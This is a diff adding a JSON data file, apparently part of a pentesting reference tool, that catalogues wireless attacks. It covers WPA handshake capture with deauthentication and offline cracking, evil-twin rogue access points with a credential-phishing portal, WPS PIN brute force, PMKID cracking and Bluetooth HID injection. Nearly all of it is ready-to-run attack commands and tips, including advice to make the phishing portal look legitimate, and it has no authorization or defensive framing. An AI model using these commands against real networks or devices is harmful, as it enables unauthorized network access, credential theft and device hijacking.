@@ -1,0 +1,200 @@
+{
+    "name": "Wireless Network Attacks",
+    "category": "wireless",
+    "description": "WiFi and wireless network exploitation techniques",
+    "icon": "📶",
+    "techniques": [
+        {
+            "id": "wifi-1",
+            "name": "WPA/WPA2 Handshake Capture",
+            "difficulty": "Intermediate",
+            "description": "Capture 4-way handshake for offline cracking",
+            "steps": [
+                "Put interface in monitor mode",
+                "Capture handshake",
+                "Deauth clients to force reconnection",
+                "Crack captured handshake"
+            ],
+            "commands": [
+                {
+                    "tool": "Monitor Mode",
+                    "command": "airmon-ng start wlan0",
+                    "description": "Enable monitor mode"
+                },
+                {
+                    "tool": "Scan Networks",
+                    "command": "airodump-ng wlan0mon",
+                    "description": "Discover nearby networks"
+                },
+                {
+                    "tool": "Capture Target",
+                    "command": "airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon",
+                    "description": "Capture target network"
+                },
+                {
+                    "tool": "Deauth Attack",
+                    "command": "aireplay-ng -0 5 -a <BSSID> -c <client_MAC> wlan0mon",
+                    "description": "Force client reconnection"
+                },
+                {
+                    "tool": "Crack with Aircrack",
+                    "command": "aircrack-ng -w rockyou.txt capture-01.cap",
+                    "description": "Crack handshake offline"
+                }
+            ],
+            "tips": [
+                "Need captured handshake (WPA handshake in airodump)",
+                "Hashcat is faster: hashcat -m 22000 hash.hc22000 wordlist.txt",
+                "Convert cap to hc22000 with hcxpcapngtool"
+            ]
+        },
+        {
+            "id": "wifi-2",
+            "name": "Evil Twin Attack",
+            "difficulty": "Advanced",
+            "description": "Create fake AP to capture credentials",
+            "steps": [
+                "Clone target AP",
+                "Set up captive portal",
+                "Deauth clients from real AP",
+                "Capture credentials"
+            ],
+            "commands": [
+                {
+                    "tool": "hostapd-wpe",
+                    "command": "hostapd-wpe hostapd.conf",
+                    "description": "Start evil twin AP"
+                },
+                {
+                    "tool": "Fluxion",
+                    "command": "fluxion",
+                    "description": "Automated evil twin framework"
+                },
+                {
+                    "tool": "WiFi-Pumpkin",
+                    "command": "wifipumpkin3",
+                    "description": "Rogue AP attack framework"
+                },
+                {
+                    "tool": "dnsmasq",
+                    "command": "dnsmasq -C dnsmasq.conf",
+                    "description": "DHCP and DNS for rogue AP"
+                }
+            ],
+            "tips": [
+                "Stronger signal than real AP helps",
+                "Phishing portal should look legitimate",
+                "HTTPS stripping may be needed"
+            ]
+        },
+        {
+            "id": "wifi-3",
+            "name": "WPS PIN Attack",
+            "difficulty": "Intermediate",
+            "description": "Exploit WPS PIN vulnerability",
+            "steps": [
+                "Check if WPS is enabled",
+                "Launch PIN brute force attack",
+                "Retrieve WiFi password"
+            ],
+            "commands": [
+                {
+                    "tool": "Check WPS",
+                    "command": "wash -i wlan0mon",
+                    "description": "Find WPS-enabled networks"
+                },
+                {
+                    "tool": "Reaver Attack",
+                    "command": "reaver -i wlan0mon -b <BSSID> -c <channel> -vv",
+                    "description": "WPS PIN brute force"
+                },
+                {
+                    "tool": "Bully",
+                    "command": "bully -b <BSSID> -c <channel> wlan0mon",
+                    "description": "Alternative WPS attack tool"
+                },
+                {
+                    "tool": "Pixie-Dust",
+                    "command": "reaver -i wlan0mon -b <BSSID> -c <channel> -K 1 -vv",
+                    "description": "Pixie-Dust offline attack"
+                }
+            ],
+            "tips": [
+                "Pixie-Dust works in seconds if vulnerable",
+                "WPS lockout may occur with brute force",
+                "Many routers now rate-limit WPS"
+            ]
+        },
+        {
+            "id": "wifi-4",
+            "name": "PMKID Attack",
+            "difficulty": "Advanced",
+            "description": "Capture PMKID without handshake",
+            "steps": [
+                "Capture PMKID from beacon frames",
+                "Convert to hashcat format",
+                "Crack offline"
+            ],
+            "commands": [
+                {
+                    "tool": "hcxdumptool",
+                    "command": "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1",
+                    "description": "Capture PMKID frames"
+                },
+                {
+                    "tool": "Convert Hash",
+                    "command": "hcxpcapngtool -o hash.hc22000 capture.pcapng",
+                    "description": "Convert to hashcat format"
+                },
+                {
+                    "tool": "Crack PMKID",
+                    "command": "hashcat -m 22000 hash.hc22000 rockyou.txt",
+                    "description": "Crack with hashcat"
+                }
+            ],
+            "tips": [
+                "No client connection needed",
+                "Works on WPA/WPA2 with PMKID enabled",
+                "Much faster than handshake capture"
+            ]
+        },
+        {
+            "id": "wifi-5",
+            "name": "Bluetooth Attacks",
+            "difficulty": "Advanced",
+            "description": "Bluetooth scanning and exploitation",
+            "steps": [
+                "Scan for Bluetooth devices",
+                "Enumerate services",
+                "Exploit vulnerabilities"
+            ],
+            "commands": [
+                {
+                    "tool": "hcitool scan",
+                    "command": "hcitool scan",
+                    "description": "Discover Bluetooth devices"
+                },
+                {
+                    "tool": "sdptool",
+                    "command": "sdptool browse <MAC>",
+                    "description": "Browse device services"
+                },
+                {
+                    "tool": "BlueDucky",
+                    "command": "python BlueDucky.py",
+                    "description": "Bluetooth HID injection"
+                },
+                {
+                    "tool": "btlejack",
+                    "command": "btlejack -d <MAC> -s",
+                    "description": "BLE (Bluetooth Low Energy) sniffing"
+                }
+            ],
+            "tips": [
+                "Many IoT devices have weak Bluetooth security",
+                "BLE is often less protected",
+                "Check for default PINs"
+            ]
+        }
+    ]
+}
